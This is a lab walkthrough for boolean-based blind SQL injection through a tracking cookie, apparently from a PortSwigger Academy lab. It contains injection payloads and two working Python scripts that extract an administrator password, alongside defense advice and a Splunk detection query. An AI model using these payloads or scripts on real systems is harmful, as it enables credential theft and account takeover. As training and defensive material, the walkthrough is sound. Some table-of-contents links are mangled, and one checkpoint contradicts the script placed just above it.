# Lab Walkthrough: Blind SQL Injection with Conditional Responses

* **Vulnerability Type:** Blind SQL Injection (Boolean-Based)
* **Target Context:** Data Exfiltration via Logical Inference
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 45–60 minutes
* **Lab Status:**  Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [SQL Injection Typology Comparison](https://www.google.com/search?q=%25234-sql-injection-typology-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense & Prevention](https://www.google.com/search?q=%25236-defense--prevention&utm_source=gemini)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%25237-detection--siem-monitoring-rules&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

Unlike In-Band `UNION` attacks, a **Blind** SQL Injection vulnerability does not return the results of the database query to the application's frontend. The attacker is flying "blind." However, the application handles the query's *True* or *False* outcome differently, creating an observable discrepancy in the HTTP response.

* **The Core Flaw:** The application executes a database query using the value of the `TrackingId` cookie to track user analytics. If the tracking ID exists (True), it renders a "Welcome back" message. If it doesn't (False), the page renders normally but omits the message.
* **The Exploit Mechanism:** By injecting logical conditions (`AND 1=1` vs `AND 1=2`), an attacker can force the database to answer binary (Yes/No) questions.
* **Real-World Analogy:** Boolean-based SQLi is exactly like playing the game "20 Questions." You cannot see the password, but you can ask the database: *"Is the first letter of the password an 'a'?"* If the application says "Welcome back" (Yes), you found the letter. If not (No), you guess 'b', and so on.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   BOOLEAN INFERENCE DATA EXFILTRATION                  │
└────────────────────────────────────────────────────────────────────────┘

  [Attacker Request] 
  Cookie: TrackingId=xyz' AND SUBSTRING(password,1,1)='a

  [Database Evaluation]
  1. Does TrackingId 'xyz' exist? -> TRUE
  2. Is the first letter of the admin password 'a'? -> TRUE/FALSE
  
  [Application Routing]
  If TRUE  -> Renders HTML containing "Welcome back" (Attacker infers 'a')
  If FALSE -> Renders HTML without "Welcome back" (Attacker guesses 'b')

```

> **Learning Checkpoint 1:** Why is Blind SQLi significantly slower than UNION SQLi? Because data cannot be extracted en masse. Every single byte (character) of the target data requires a separate HTTP request and logical comparison to infer its value.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `TrackingId` HTTP Cookie.
* **Primary Objective:** Extract the `administrator` password character-by-character using boolean inference, then authenticate to the admin panel.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Boolean Inference Testing (The Baseline)

Verify that the injection point yields different responses for True/False conditions.

* **Inject TRUE Condition:** `Cookie: TrackingId=xyz' AND '1'='1`
* *Result:* The page contains the text "Welcome back".


* **Inject FALSE Condition:** `Cookie: TrackingId=xyz' AND '1'='2`
* *Result:* The page does *not* contain the text "Welcome back".
* *Conclusion:* We have a reliable boolean oracle.



### Phase 2: Schema & Target Verification

Ask the database if the target table and user exist.

* **Test Table:** `Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
* *Result:* "Welcome back" confirms the `users` table exists.


* **Test User:** `Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
* *Result:* "Welcome back" confirms the `administrator` user exists.



### Phase 3: Payload Length Enumeration

Determine the length of the password to know how many characters to extract.

* **Test Length:** `Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
* Increment the `>1` value until the "Welcome back" message disappears.
* *Result:* The message disappears at `>20`. The password is exactly **20 characters long**.

### Phase 4: Character-by-Character Exfiltration

Use Burp Suite Intruder (or a custom script) to extract the password.

1. Capture the request in Burp Suite and send to **Intruder**.
2. Set the payload position on the guessed character:
`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
3. **Payload Configuration:** Set a Simple List with characters `a-z` and `0-9`.
4. **Options (Grep - Match):** Add `Welcome back` to flag successful guesses.
5. Start the attack. The request that returns "Welcome back" indicates the correct first character.
6. Increment the offset `SUBSTRING(password,2,1)` and repeat 19 more times to get the full string.

> **Learning Checkpoint 2:** What is the `SUBSTRING()` function doing? It slices a string into smaller parts. `SUBSTRING(string, start_position, length)`. So, `SUBSTRING(password, 2, 1)` pulls exactly 1 character starting at the 2nd position. Note: SQL strings are generally 1-indexed, not 0-indexed.

---

## 4. SQL Injection Typology Comparison

Understanding extraction methodologies is critical for choosing the right tool during an engagement.

| SQLi Type | Data Channel | Speed | Execution Profile |
| --- | --- | --- | --- |
| **In-Band (UNION)** | Frontend UI | Extremely Fast | Direct matrix mapping, immediate extraction. |
| **Boolean Blind** | Logical Inference (UI Change) | Slow (Linear/Binary) | 1 request per character attempt. High traffic noise. |
| **Time-Based Blind** | Temporal Inference (Delays) | Very Slow | Used when UI doesn't change. Waits `pg_sleep(10)` to infer True. |
| **Error-Based** | Database Exception Output | Fast | Forces the DB to print the query result inside an XML/Math error string. |

---

## 5. Automated Exploitation Script (Python PoC)

Extracting a 20-character password manually via Burp Intruder requires 20 separate attacks. An automated Python script using the `requests` library is the industry standard approach for Blind SQLi.

```python
#!/usr/bin/env python3
"""
Boolean Blind SQLi Exfiltration Script (PoC)
Iterates through character positions to extract data via logical inference.
"""

import requests
import string
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_password(target_url, original_tracking_id):
    # The character space defined by the lab (lowercase alphanumeric)
    charset = string.ascii_lowercase + string.digits
    password = ""
    password_length = 20 # Pre-determined from Phase 3
    
    print(f"[*] Commencing Boolean Blind Data Exfiltration against {target_url}")
    print(f"[*] Target Length: {password_length} characters")
    
    # Iterate through each position in the password
    for position in range(1, password_length + 1):
        for char in charset:
            # Construct the boolean payload
            payload = f"{original_tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
            
            cookies = {'TrackingId': payload}
            
            # Send request
            sys.stdout.write(f"\r[*] Testing position {position}: {password}{char}")
            sys.stdout.flush()
            
            response = requests.get(target_url, cookies=cookies, verify=False)
            
            # The boolean oracle: Does the response contain the welcome message?
            if "Welcome back" in response.text:
                password += char
                break # Character found, move to the next position

    print(f"\n\n[+] EXFILTRATION COMPLETE")
    print(f"[+] Administrator Password: {password}")
    print("[*] Proceed to /login for account takeover.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 blind_sqli.py <TARGET_URL> <VALID_TRACKING_ID>")
        print("Example: python3 blind_sqli.py https://0a...web-security-academy.net xyz")
        sys.exit(1)
        
    extract_password(sys.argv[1].rstrip('/'), sys.argv[2])

```
## Optimized

```python
import requests
import string
import sys
import concurrent.futures

URL = "https://0a3e009103d8549081cb3fb9006e00ec.web-security-academy.net/login"
BASE_TRACKING_ID = "jcNRA8merHx7L1cA"
SESSION_ID = "3fiB8hekGGxKB4OmSB3pqFDFh98oTpBr"

CHARSET = string.ascii_lowercase + string.digits

# Reuse a single TCP connection instead of opening a new one per request
session = requests.Session()

def oracle(condition: str) -> bool:
    payload = f"' AND {condition}--"
    cookies = {'TrackingId': BASE_TRACKING_ID + payload, 'session': SESSION_ID}
    r = session.get(URL, cookies=cookies)
    return "Welcome back" in r.text

def get_length(max_len=100) -> int:
    # Binary search instead of linear 1..100 scan
    lo, hi = 1, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"(SELECT LENGTH(password) FROM users WHERE username='administrator')<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    print(f"[+] Password length: {lo}")
    return lo

def get_char_at(pos: int) -> str:
    # Binary search over ASCII code instead of trying every character
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator')<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo)

def get_data(length: int) -> str:
    # Extract each position concurrently instead of one at a time
    chars = [None] * length
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(get_char_at, i + 1): i for i in range(length)}
        for fut in concurrent.futures.as_completed(futures):
            idx = futures[fut]
            chars[idx] = fut.result()
            sys.stdout.write(f"\r[+] {''.join(c or '_' for c in chars)}")
            sys.stdout.flush()
    print()
    return "".join(chars)

if __name__ == "__main__":
    pwd_length = get_length()
    password = get_data(pwd_length)
    print(f"[+] Administrator password: {password}")
```
> **Learning Checkpoint 3:** How could this script be optimized? The current script uses a **Linear Search**, testing `a`, then `b`, then `c` (O(N) time). Advanced tooling (like SQLmap) uses a **Binary Search** (`> 'm'`), repeatedly halving the character space to find the target character in ~6 requests instead of up to 36 requests (O(log N) time), drastically reducing network noise and execution time.

---

## 6. Defense & Prevention

* **Parameterized Queries:** The primary defense against all forms of SQLi, including Blind. If the `TrackingId` is parameterized, the database engine will treat `' AND '1'='1` as a literal string value to search for, rather than executable boolean logic.
* **Cookie Integrity (Signed Cookies):** Using cryptographic signatures (e.g., HMAC) on tracking cookies ensures that if a user tampers with the cookie value, the application rejects it before passing it to the database layer.

---

## 7. Detection & SIEM Monitoring Rules

Boolean Blind SQLi is highly noisy. It generates hundreds or thousands of nearly identical requests originating from a single IP within a short timeframe.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| search cookie="*TrackingId=*" AND (cookie="*AND*" OR cookie="*SUBSTRING*" OR cookie="*LENGTH*")
| stats count by src_ip, cookie
| where count > 50

```

*Indicator of Attack (IoA):* Security analysts should look for massive spikes in request volume on endpoints parsing cookies or headers, specifically looking for iterations containing SQL string manipulation functions (`SUBSTRING`, `MID`, `ASCII`, `CHAR_LENGTH`).

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **"Welcome back" never disappears during testing** | Improper string termination. | Ensure you are cleanly escaping the existing query. The lab uses single quotes (`xyz' AND ...`), but others might require closing parentheses (`xyz') AND ...`). |
| **All characters fail in Burp Intruder** | URL Encoding issues. | Ensure Burp Intruder is URL-encoding the payload payload characters (especially spaces, `=`, and `>`) before transmitting the HTTP request. |
| **Script hangs or misses characters** | Target throttling / Network latency. | If the backend drops requests due to rate limiting, add a slight delay (`time.sleep(0.1)`) between requests in your Python loop. |

---

## 9. References & Standards

* [PortSwigger: Blind SQL Injection](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/blind&utm_source=gemini)
* [OWASP: Blind SQL Injection](https://www.google.com/search?q=https://owasp.org/www-community/attacks/Blind_SQL_Injection&utm_source=gemini)
* [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/&utm_source=gemini)

---

> **Key Insight:** Blind SQL injection proves that an attacker does not need to see the output of a command to steal data. By leveraging logical inference and automation, an adversary can use the application's binary responses (True/False) as a covert side-channel to reliably exfiltrate entire databases bit by bit.
